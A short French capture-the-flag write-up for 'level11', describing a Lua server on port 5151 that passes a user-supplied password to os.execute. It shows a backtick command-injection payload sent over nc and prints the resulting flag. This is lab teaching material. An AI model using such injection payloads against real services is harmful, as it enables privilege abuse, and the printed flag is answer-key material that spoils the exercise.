# level11

## Contexte

On trouve un script Lua `level11.lua`.

Le script lance un serveur sur le port `5151`.

## Recherche

On regarde le contenu du script :

```bash
cat level11.lua
```

On remarque que le mot de passe reçu est utilisé directement dans une commande :

```lua
os.execute(...)
```

Une partie de cette commande est contrôlée par l'utilisateur.

## Vulnérabilité

Le script construit une commande système avec une donnée fournie par l'utilisateur.

Il est donc possible d'injecter une commande supplémentaire.

Le script étant exécuté avec les droits de `flag11`, la commande injectée sera exécutée avec ces mêmes droits.

## Exploitation

On se connecte au serveur :

```bash
nc localhost 5151
```

On envoie une commande à la place du mot de passe :

```text
`getflag` > /tmp/flag
```

Le script exécute notre commande.

Il ne reste plus qu'à lire le résultat :

```bash
cat /tmp/flag

fa6v5ateaw21peobuub8ipe6s
```

## Ressources

- Lua
- `os.execute`
- Injection de commande
- `nc`